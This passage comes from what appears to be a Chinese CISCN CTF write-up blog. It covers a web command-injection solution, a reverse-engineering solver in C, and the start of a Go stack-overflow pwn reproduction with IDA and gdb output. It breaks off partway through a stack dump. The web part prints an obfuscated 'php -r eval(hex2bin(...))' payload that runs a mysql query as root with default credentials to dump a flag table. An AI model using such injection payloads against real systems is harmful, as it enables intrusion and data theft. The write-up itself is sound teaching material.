class=\"literal\">-e</span> <span class=\"string\">&quot;SELECT * FROM PHP_CMS.F1ag_Se3Re7&quot;</span>`;  </span><br><span class=\"line\">//payload</span><br><span class=\"line\">cmd=php+<span class=\"literal\">-r</span>+eval(hex2bin(substr(aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202253454c454354202a2046524f4d205048505f434d532e463161675f53653352653722603b,<span class=\"number\">2</span>)));</span><br><span class=\"line\">//结果</span><br><span class=\"line\">Warning: Use of undefined constant aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202253454c454354202a2046524f4d205048505f434d532e463161675f53653352653722603b - assumed <span class=\"string\">&#x27;aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202253454c454354202a2046524f4d205048505f434d532e463161675f53653352653722603b&#x27;</span> (this will <span class=\"keyword\">throw</span> an Error <span class=\"keyword\">in</span> a future version of PHP) <span class=\"keyword\">in</span> Command line code on line <span class=\"number\">1</span></span><br><span class=\"line\">id\tf1ag66_2024</span><br><span class=\"line\"><span class=\"number\">1</span>\tflag&#123;e784d525<span class=\"literal\">-93a1-466b-9f22-38a3add54dfe</span>&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\tflag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;e784d525-93a1-466b-9f22-38a3add54dfe&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t补充：</p>\n<blockquote>\n<p>1. 因为存在 escapeshellcmd 函数，所以在转义之后，在 system 函数中，&quot;在经过 hex2bin 之后，就能够表示字符串&quot; 本身<br>\n 2. 在构造 substr 的时候，第一个参数没有引号也能正常使用，只是会出现一个报错</p>\n</blockquote>\n<h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> Re</h2>\n<h3 id=\"asm_re\"><a class=\"markdownIt-Anchor\" href=\"#asm_re\">#</a> asm_re</h3>\n<p>ex<br>\n 数据段，数据段分配内存，每一个数据段会获得 2 个内存单元<br>\n计算机采用小端存储，小端字节序存储：把一个数据的低位字节的内容，存储在低地址处，把高位字节的内容，存储在高地址处；<br>\n数据段：存放数据的段。使用时候，用 DS 寄存器<br>\n大于一个字节长度的 16<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTglQkYlOUIlRTUlODglQjYmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\"> 进制</span>数据进行高低位分割之后进行传输<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/9bd76a5d388c6179608478ae4475a8c9.png\" alt=\"image.png\"><br>\nDCB：用于分配一片连续的字节存储单元并用指定的数据初始化<br>\n DCB 表示：它分配一段字节的内存单元，它每个操作数都占有一个字节，操作数范围为 - 128～255 的数值或字符串。<br>\n关键部分<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/a2e84faa2cc3dfc118736c6fdc18b8b3.png\" alt=\"image.png\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> flag[<span class=\"number\">100</span>];</span><br><span class=\"line\">    <span class=\"type\">int</span> data[] =  &#123;<span class=\"number\">0x1FD7</span>, <span class=\"number\">0x21B7</span>, <span class=\"number\">0x1E47</span>, <span class=\"number\">0x2027</span>, <span class=\"number\">0x26E7</span>, <span class=\"number\">0x10D7</span>, <span class=\"number\">0x1127</span>, <span class=\"number\">0x2007</span>, <span class=\"number\">0x11c7</span>, <span class=\"number\">0x1e47</span>, <span class=\"number\">0x1017</span>, <span class=\"number\">0x1017</span>,</span><br><span class=\"line\">                   <span class=\"number\">0x11f7</span>, <span class=\"number\">0x2007</span>, <span class=\"number\">0x1037</span>, <span class=\"number\">0x1107</span>, <span class=\"number\">0x1f17</span>, <span class=\"number\">0x10d7</span>, <span class=\"number\">0x1017</span>, <span class=\"number\">0x1017</span>, <span class=\"number\">0x1f67</span>, <span class=\"number\">0x1017</span>, <span class=\"number\">0x11c7</span>, <span class=\"number\">0x11c7</span>, <span class=\"number\">0x1017</span>,</span><br><span class=\"line\">                   <span class=\"number\">0x1fd7</span>, <span class=\"number\">0x1f17</span>, <span class=\"number\">0x1107</span>, <span class=\"number\">0xf47</span>, <span class=\"number\">0x1127</span>, <span class=\"number\">0x1037</span>, <span class=\"number\">0x1e47</span>, <span class=\"number\">0x1037</span>, <span class=\"number\">0x1fd7</span>, <span class=\"number\">0x1107</span>, <span class=\"number\">0x1fd7</span>, <span class=\"number\">0x1107</span>, <span class=\"number\">0x2787</span>&#125;;</span><br><span class=\"line\">    <span class=\"type\">int</span> len;</span><br><span class=\"line\">    len=<span class=\"keyword\">sizeof</span>(data)/<span class=\"keyword\">sizeof</span>(data[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    <span class=\"type\">int</span> index=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> j=<span class=\"number\">0</span>;j&lt;len;j++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">32</span>;i&lt;<span class=\"number\">128</span>;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>((((i*<span class=\"number\">0x50</span>+<span class=\"number\">0x14</span>)^<span class=\"number\">0x4D</span>)+<span class=\"number\">0x1E</span>)==data[j])</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                flag[index++]=(<span class=\"type\">char</span>)i;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    flag[index]=<span class=\"string\">&#x27;\\0&#x27;</span>;<span class=\"comment\">//char型</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(flag);</span><br><span class=\"line\">    <span class=\"comment\">//flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;\t</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> Pwn</h2>\n<h3 id=\"gostack复现\"><a class=\"markdownIt-Anchor\" href=\"#gostack复现\">#</a> gostack（复现）:</h3>\n<p>go 语言的栈溢出，没遇到过，赛后复现下，看看能否干出来。<br>\n首先是检查保护，不过 64 位，出了 NX 之外没有任何保护，那就简单不少，拖到 IDA 里看看，很轻松就能找到 mainmain：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// main.main</span><br><span class=\"line\">void __fastcall main_main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v0; // r14</span><br><span class=\"line\">  void *retaddr; // [<span class=\"type\">rsp</span>+<span class=\"number\">8</span><span class=\"type\">h</span>] [<span class=\"type\">rbp</span>+<span class=\"number\">0</span><span class=\"type\">h</span>] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( (unsigned __int64)&amp;retaddr &lt;= *(_QWORD *)(v0 + <span class=\"number\">16</span>) )</span><br><span class=\"line\">    runtime_morestack_noctxt();</span><br><span class=\"line\">  main_main_func1();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (unsigned __int8)main_main_func3() )</span><br><span class=\"line\">    main_main_func2();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>不过这个很明显，有点看不懂，毕竟没接触过 go 语言，那么，先直接运行下看看程序是啥情况？：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@g01den<span class=\"literal\">-virtual-machine</span>:/mnt/shared<span class=\"comment\"># ./pwn</span></span><br><span class=\"line\">Welcome to CISCN!</span><br><span class=\"line\">Happy magic golang!</span><br><span class=\"line\">Input your magic message :</span><br><span class=\"line\">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaaaaa</span><br><span class=\"line\">Your magic message :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaaaaa</span><br></pre></td></tr></table></figure>\n<p>就结束了，没了，感觉很简单，有输入，但是只有一次写入。<br>\n这个运行里给了一部分信息，那么凭借这些信息很轻松就找到了主要部分函数的地方：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// main.main.func3</span><br><span class=\"line\">__int64 __golang main_main_func3(__int64 a1, __int64 a2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v2; // r14</span><br><span class=\"line\">  __int128 v3; // xmm15</span><br><span class=\"line\">  __int64 v4; // rax</span><br><span class=\"line\">  __int64 v5; // rcx</span><br><span class=\"line\">  __int64 v6; // rdx</span><br><span class=\"line\">  int v7; // r11d</span><br><span class=\"line\">  int v8; // ebx</span><br><span class=\"line\">  int v9; // r11d</span><br><span class=\"line\">  int v10; // ecx</span><br><span class=\"line\">  int v11; // r8d</span><br><span class=\"line\">  int v12; // r9d</span><br><span class=\"line\">  int v13; // r10d</span><br><span class=\"line\">  int v14; // r11d</span><br><span class=\"line\">  __int64 v15; // rbx</span><br><span class=\"line\">  int v16; // r8d</span><br><span class=\"line\">  int v17; // r9d</span><br><span class=\"line\">  int v18; // r10d</span><br><span class=\"line\">  int v19; // r11d</span><br><span class=\"line\">  int v20; // ecx</span><br><span class=\"line\">  int v21; // r8d</span><br><span class=\"line\">  int v22; // r9d</span><br><span class=\"line\">  int v23; // r11d</span><br><span class=\"line\">  char *v24; // rdx</span><br><span class=\"line\">  unsigned __int8 *v25; // r10</span><br><span class=\"line\">  __int64 i; // rax</span><br><span class=\"line\">  __int64 v27; // rax</span><br><span class=\"line\">  int v28; // r10d</span><br><span class=\"line\">  int v29; // r11d</span><br><span class=\"line\">  __int64 v31; // [<span class=\"type\">rsp</span>+<span class=\"number\">10</span><span class=\"type\">h</span>] [<span class=\"type\">rbp</span>-<span class=\"number\">208</span><span class=\"type\">h</span>]</span><br><span class=\"line\">  __int64 v32; // [<span class=\"type\">rsp</span>+<span class=\"number\">10</span><span class=\"type\">h</span>] [<span class=\"type\">rbp</span>-<span class=\"number\">208</span><span class=\"type\">h</span>]</span><br><span class=\"line\">  char v33[<span class=\"number\">72</span>]; // [<span class=\"type\">rsp</span>+<span class=\"number\">48</span><span class=\"type\">h</span>] [<span class=\"type\">rbp</span>-<span class=\"number\">1</span><span class=\"type\">D0h</span>] BYREF</span><br><span class=\"line\">  char v34; // [<span class=\"type\">rsp</span>+<span class=\"number\">90</span><span class=\"type\">h</span>] [<span class=\"type\">rbp</span>-<span class=\"number\">188</span><span class=\"type\">h</span>] BYREF</span><br><span class=\"line\">  unsigned __int8 *v35; // [<span class=\"type\">rsp</span>+<span class=\"number\">148</span><span class=\"type\">h</span>] [<span class=\"type\">rbp</span>-<span class=\"type\">D0h</span>]</span><br><span class=\"line\">  __int64 v36; // [<span class=\"type\">rsp</span>+<span class=\"number\">150</span><span class=\"type\">h</span>] [<span class=\"type\">rbp</span>-<span class=\"type\">C8h</span>]</span><br><span class=\"line\">  __int128 v37; // [<span class=\"type\">rsp</span>+<span class=\"number\">158</span><span class=\"type\">h</span>] [<span class=\"type\">rbp</span>-<span class=\"type\">C0h</span>] BYREF</span><br><span class=\"line\">  _QWORD v38[<span class=\"number\">2</span>]; // [<span class=\"type\">rsp</span>+<span class=\"number\">168</span><span class=\"type\">h</span>] [<span class=\"type\">rbp</span>-<span class=\"type\">B0h</span>] BYREF</span><br><span class=\"line\">  char *v39; // [<span class=\"type\">rsp</span>+<span class=\"number\">178</span><span class=\"type\">h</span>] [<span class=\"type\">rbp</span>-<span class=\"type\">A0h</span>]</span><br><span class=\"line\">  __int64 v40; // [<span class=\"type\">rsp</span>+<span class=\"number\">180</span><span class=\"type\">h</span>] [<span class=\"type\">rbp</span>-<span class=\"number\">98</span><span class=\"type\">h</span>]</span><br><span class=\"line\">  __int64 v41; // [<span class=\"type\">rsp</span>+<span class=\"number\">188</span><span class=\"type\">h</span>] [<span class=\"type\">rbp</span>-<span class=\"number\">90</span><span class=\"type\">h</span>]</span><br><span class=\"line\">  __int64 v42[<span class=\"number\">4</span>]; // [<span class=\"type\">rsp</span>+<span class=\"number\">190</span><span class=\"type\">h</span>] [<span class=\"type\">rbp</span>-<span class=\"number\">88</span><span class=\"type\">h</span>] BYREF</span><br><span class=\"line\">  __int64 v43; // [<span class=\"type\">rsp</span>+<span class=\"number\">1</span><span class=\"type\">B0h</span>] [<span class=\"type\">rbp</span>-<span class=\"number\">68</span><span class=\"type\">h</span>]</span><br><span class=\"line\">  __int64 v44; // <span class=\"function\">[<span class=\"type\">rsp</span>+<span class=\"number\">1</span><span class=\"type\">B8h</span>] [<span class=\"type\">rbp</span>-<span class=\"number\">60</span><span class=\"type\">h</span>]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( (unsigned __int64)&amp;v34 &lt;= *(_QWORD *)(v2 + <span class=\"number\">16</span>) )</span><br><span class=\"line\">    runtime_morestack_noctxt();</span><br><span class=\"line\">  v4 = ((__int64 (__fastcall *)(char *))loc_4606F4)(v33);</span><br><span class=\"line\">  v39 = v33;</span><br><span class=\"line\">  v40 = <span class=\"number\">256</span>LL;</span><br><span class=\"line\">  v41 = <span class=\"number\">256</span>LL;</span><br><span class=\"line\">  ((void (__golang *)(__int64, __int64, __int64, __int64 *))loc_460722)(v4, a2, v5, v42);</span><br><span class=\"line\">  v42[<span class=\"number\">0</span>] = (__int64)off_4DF4E8;</span><br><span class=\"line\">  v42[<span class=\"number\">1</span>] = v6;</span><br><span class=\"line\">  v42[<span class=\"number\">2</span>] = (__int64)&amp;off_4C5DD0;</span><br><span class=\"line\">  v42[<span class=\"number\">3</span>] = <span class=\"number\">0</span>x10000LL;</span><br><span class=\"line\">  fmt_Fprintf(</span><br><span class=\"line\">    (unsigned int)off_4DF508,</span><br><span class=\"line\">    qword_5633E8,</span><br><span class=\"line\">    (unsigned int)<span class=\"string\">&quot;Happy magic golang!\\n&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">20</span>,</span><br><span class=\"line\">    <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"number\">0</span>,</span><br><span class=\"line\">    (unsigned int)off_4DF4E8,</span><br><span class=\"line\">    v7);</span><br><span class=\"line\">  v38[<span class=\"number\">0</span>] = &amp;RTYPE_string;</span><br><span class=\"line\">  v38[<span class=\"number\">1</span>] = &amp;off_4DF040;</span><br><span class=\"line\">  v8 = qword_5633E8;</span><br><span class=\"line\">  fmt_Fprintf(</span><br><span class=\"line\">    (unsigned int)off_4DF508,</span><br><span class=\"line\">    qword_5633E8,</span><br><span class=\"line\">    (unsigned int)<span class=\"string\">&quot;%s&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">2</span>,</span><br><span class=\"line\">    (unsigned int)v38,</span><br><span class=\"line\">    <span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"number\">1</span>,</span><br><span class=\"line\">    (unsigned int)&amp;off_4DF040,</span><br><span class=\"line\">    v9);</span><br><span class=\"line\">  bufio__ptr_Scanner_Scan((unsigned int)v42, v8, v10, <span class=\"number\">2</span>, (unsigned int)v38, v11, v12, v13, v14);</span><br><span class=\"line\">  v15 = v43;</span><br><span class=\"line\">  v35 = (unsigned __int8 *)runtime_slicebytetostring(<span class=\"number\">0</span>, v43, v44, <span class=\"number\">2</span>, (unsigned int)v38, v16, v17, v18, v19, v31);</span><br><span class=\"line\">  v36 = v15;</span><br><span class=\"line\">  v24 = v39;</span><br><span class=\"line\">  v25 = v35;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>LL; v15 &gt; i; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v20 = *v25;</span><br><span class=\"line\">    *v24++ = v20;</span><br><span class=\"line\">    ++v25;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v37 = v3;</span><br><span class=\"line\">  v27 = runtime_convTstring((_DWORD)v35, v36, v20, <span class=\"number\">2</span>, (unsigned int)v38, v21, v22, (_DWORD)v25, v23, v32);</span><br><span class=\"line\">  *(_QWORD *)&amp;v37 = &amp;RTYPE_string;</span><br><span class=\"line\">  *((_QWORD *)&amp;v37 + <span class=\"number\">1</span>) = v27;</span><br><span class=\"line\">  fmt_Fprintf(</span><br><span class=\"line\">    (unsigned int)off_4DF508,</span><br><span class=\"line\">    qword_5633E8,</span><br><span class=\"line\">    (unsigned int)<span class=\"string\">&quot;Your magic message :%s\\n\\&quot;</span>, missing CPU supp<span class=\"string\">&quot;,</span></span><br><span class=\"line\"><span class=\"string\">    23,</span></span><br><span class=\"line\"><span class=\"string\">    (unsigned int)&amp;v37,</span></span><br><span class=\"line\"><span class=\"string\">    1,</span></span><br><span class=\"line\"><span class=\"string\">    1,</span></span><br><span class=\"line\"><span class=\"string\">    v28,</span></span><br><span class=\"line\"><span class=\"string\">    v29);</span></span><br><span class=\"line\"><span class=\"string\">  return 0LL;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>作为一个新人，我敢保证我眼睛看瞎了也看不懂这玩意儿，因此，先 gdb 一下再说，在那之前，先下断点，</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:<span class=\"number\">00000000004</span>A0974                 movups  [<span class=\"type\">rsp</span>+<span class=\"number\">208</span><span class=\"type\">h</span>+<span class=\"type\">var_B0</span>], xmm15</span><br><span class=\"line\">.text:<span class=\"number\">00000000004</span>A097D                 lea     rdx, RTYPE_string</span><br><span class=\"line\">.text:<span class=\"number\">00000000004</span>A0984                 mov     qword ptr [<span class=\"type\">rsp</span>+<span class=\"number\">208</span><span class=\"type\">h</span>+<span class=\"type\">var_B0</span>], rdx</span><br><span class=\"line\">.text:<span class=\"number\">00000000004</span>A098C                 lea     r10, off_4DF040 ; <span class=\"string\">&quot;Input your magic message :\\nSIG&quot;</span></span><br><span class=\"line\">.text:<span class=\"number\">00000000004</span>A0993                 mov     qword ptr [<span class=\"type\">rsp</span>+<span class=\"number\">208</span><span class=\"type\">h</span>+<span class=\"type\">var_B0</span>+<span class=\"number\">8</span>], r10</span><br><span class=\"line\">.text:<span class=\"number\">00000000004</span>A099B                 mov     rbx, cs:qword_5633E8</span><br><span class=\"line\">.text:<span class=\"number\">00000000004</span>A09A2                 lea     rax, off_4DF508</span><br><span class=\"line\">.text:<span class=\"number\">00000000004</span>A09A9                 lea     rcx, aS_2       ; <span class=\"string\">&quot;%s&quot;</span></span><br><span class=\"line\">.text:<span class=\"number\">00000000004</span>A09B0                 mov     edi, <span class=\"number\">2</span></span><br><span class=\"line\">.text:<span class=\"number\">00000000004</span>A09B5                 lea     rsi, [<span class=\"type\">rsp</span>+<span class=\"number\">208</span><span class=\"type\">h</span>+<span class=\"type\">var_B0</span>]</span><br><span class=\"line\">.text:<span class=\"number\">00000000004</span>A09BD                 mov     r8d, <span class=\"number\">1</span></span><br><span class=\"line\">.text:<span class=\"number\">00000000004</span>A09C3                 mov     r9, r8</span><br><span class=\"line\">.text:<span class=\"number\">00000000004</span>A09C6                 call    fmt_Fprintf</span><br><span class=\"line\">.text:<span class=\"number\">00000000004</span>A09CB                 lea     rax, [<span class=\"type\">rsp</span>+<span class=\"number\">208</span><span class=\"type\">h</span>+<span class=\"type\">var_88</span>]</span><br><span class=\"line\">.text:<span class=\"number\">00000000004</span>A09D3                 call    bufio__ptr_Scanner_Scan</span><br></pre></td></tr></table></figure>\n<p>这里找到了需要下断点的大概的地址，就是最后这一行的这里是输入的函数，下断点之后，再继续进行调试，之后就发现了一点奇怪的东西，就是这儿：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│<span class=\"literal\">-1f8</span> <span class=\"number\">0</span>xc000044d68 —▸ <span class=\"number\">0</span>xc0000b2000 ◂— <span class=\"string\">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\n&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>栈的上下都没有写入的 AAA…，但是这个题目又叫栈溢出，就很耐人寻味是为啥，不过，懒得考虑那么多了，再继续 gdb 走起，之后就发现了，AAA 被逐渐逐渐地写入到了栈上：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ rsp   <span class=\"number\">0</span>xc000049d60 ◂— <span class=\"number\">0</span>x0</span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│<span class=\"literal\">-1f8</span>   <span class=\"number\">0</span>xc000049d68 —▸ <span class=\"number\">0</span>xc000102000 ◂— <span class=\"string\">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│<span class=\"literal\">-1f0</span>   <span class=\"number\">0</span>xc000049d70 ◂— <span class=\"number\">0</span>x24 /* <span class=\"string\">&#x27;$&#x27;</span> */</span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│<span class=\"literal\">-1e8</span>   <span class=\"number\">0</span>xc000049d78 ◂— <span class=\"number\">0</span>x2</span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│<span class=\"literal\">-1e0</span>   <span class=\"number\">0</span>xc000049d80 —▸ <span class=\"number\">0</span>xc000049eb8 —▸ <span class=\"number\">0</span>x4aa800 ◂— <span class=\"number\">0</span>x10</span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│<span class=\"literal\">-1d8</span>   <span class=\"number\">0</span>xc000049d88 ◂— <span class=\"number\">0</span>x1</span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│<span class=\"literal\">-1d0</span>   <span class=\"number\">0</span>xc000049d90 ◂— <span class=\"number\">0</span>x1</span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">0038</span>│ rdx<span class=\"literal\">-7</span> <span class=\"number\">0</span>xc000049d98 ◂— <span class=\"number\">0</span>x61616161616161 /* <span class=\"string\">&#x27;aaaaaaa&#x27;</span> */ &lt;<span class=\"literal\">----</span>这里可以看到被写入了栈上</span><br></pre></td></tr></table></figure>\n<p>然后查看栈空间的布局：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">0038</span>│ rdx<span class=\"literal\">-7</span> <span class=\"number\">0</span>xc000049d98 ◂— <span class=\"number\">0</span>x61616161616161 /* <span class=\"string\">&#x27;aaaaaaa&#x27;</span> */</span><br><span class=\"line\"><span class=\"number\">08</span>:<span class=\"number\">0040</span>│<span class=\"literal\">-1c0</span>   <span class=\"number\">0</span>xc000049da0 ◂— <span class=\"number\">0</span>x0</span><br><span class=\"line\">... ↓          <span 